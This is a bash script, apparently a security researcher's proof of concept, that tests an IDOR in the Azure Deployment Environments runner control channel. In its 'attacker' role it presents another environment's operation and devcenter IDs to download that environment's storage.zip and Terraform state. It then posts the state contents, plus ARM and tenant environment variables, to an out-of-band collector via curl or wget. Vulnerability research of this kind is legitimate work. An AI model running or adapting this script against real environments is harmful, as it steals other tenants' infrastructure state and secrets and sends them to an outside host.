#!/usr/bin/env bash
# Diagnostic entrypoint for authorized Azure Deployment Environments runner research.
# Records runtime context and the ADE Runner-Management control-channel behavior, forwarding
# to the researcher OOB collector for analysis. Read-only against the platform except for the
# victim role, which uploads its OWN environment's storage.zip (a supported runner operation).
set +e
OOB="${OOB:-}"; ROLE="${ROLE:-diag}"
ADE="ade"; command -v ade >/dev/null 2>&1 || ADE="/adecli/ade"

send() { # send <tag> <data>
  local tag="$1"; local data="$2"
  [ -z "$OOB" ] && return 0
  if command -v curl >/dev/null 2>&1; then
    curl -s -m 25 -X POST "$OOB/$ROLE/$tag" --data-binary "$data" >/dev/null 2>&1
  else
    wget -q -O /dev/null --timeout=25 --post-data="$data" "$OOB/$ROLE/$tag" 2>/dev/null
  fi
}

send ctx "$(env | grep -iE '^ADE_HTTP|^ADE_ENVIRONMENT|^ADE_OPERATION|^ADE_SUBSCRIPTION|^ADE_TENANT|^ARM_' | sort)"

if [ "$ROLE" = "victim" ]; then
  send vinfo "opid=$ADE_HTTP__OPERATIONID|dcid=$ADE_HTTP__DEVCENTERID|endpoint=$ADE_HTTP__ENDPOINT|env=$ADE_ENVIRONMENT_NAME|sentinel=$SENTINEL"
  # Push this environment's OWN storage.zip (environment.tfstate with the planted secret) to the
  # backing store now, so it exists while the operation is held live.
  up="$($ADE files upload --folder-path "$ADE_STORAGE" 2>&1)"
  send vupload "rc=$?|out=$up|$(ls -la "$ADE_STORAGE" 2>&1)"
  HOLD="${HOLD:-0}"
  send vhold "holding ${HOLD}s op=$ADE_HTTP__OPERATIONID"
  [ "$HOLD" -gt 0 ] 2>/dev/null && sleep "$HOLD"
  exit 0
fi

if [ "$ROLE" = "attacker" ]; then
  # Baseline: this runner's OWN identity + own operation (should work for own env once uploaded).
  send abaseline "own_op=$ADE_HTTP__OPERATIONID own_dcid=$ADE_HTTP__DEVCENTERID"
  if [ -n "$TARGET_OP" ]; then
    mkdir -p /tmp/x
    # Present the TARGET environment's live capability ids while authenticated as THIS runner's
    # (different) deployment identity, addressing the real regional Runner-Management gateway.
    L="$(ADE_HTTP__OPERATIONID="$TARGET_OP" ADE_HTTP__DEVCENTERID="${TARGET_DCID:-$ADE_HTTP__DEVCENTERID}" $ADE files list 2>&1)"
    ADE_HTTP__OPERATIONID="$TARGET_OP" ADE_HTTP__DEVCENTERID="${TARGET_DCID:-$ADE_HTTP__DEVCENTERID}" \
      $ADE files download --file-name storage.zip --folder-path /tmp/x --unzip >/tmp/x/dl.txt 2>&1
    rc=$?
    send idor "$(echo "## target_op=$TARGET_OP target_dcid=$TARGET_DCID"; echo '## files list:'; echo "$L"; echo "## download rc=$rc:"; cat /tmp/x/dl.txt; echo '## dir:'; ls -laR /tmp/x 2>&1; echo '## TARGET tfstate (head):'; head -c 9000 /tmp/x/environment.tfstate 2>&1)"
  fi
  exit 0
fi
exit 0
